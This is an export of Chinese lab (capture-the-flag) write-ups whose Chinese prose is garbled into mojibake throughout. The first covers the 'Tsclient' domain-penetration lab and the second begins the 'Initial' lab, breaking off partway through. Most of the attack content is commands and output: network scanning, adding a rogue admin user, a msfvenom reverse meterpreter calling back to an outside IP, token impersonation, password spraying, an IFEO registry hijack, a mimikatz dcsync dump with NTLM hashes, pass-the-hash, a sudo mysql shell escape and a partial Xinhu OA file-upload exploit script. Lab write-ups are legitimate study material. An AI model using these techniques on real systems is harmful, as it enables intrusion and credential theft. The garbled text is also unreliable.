19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰\næŒ‚è½½äº†cç›˜\næŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]\râ””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) æˆ‘è¿™é‡Œé€‰æ‹©ç™»31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, 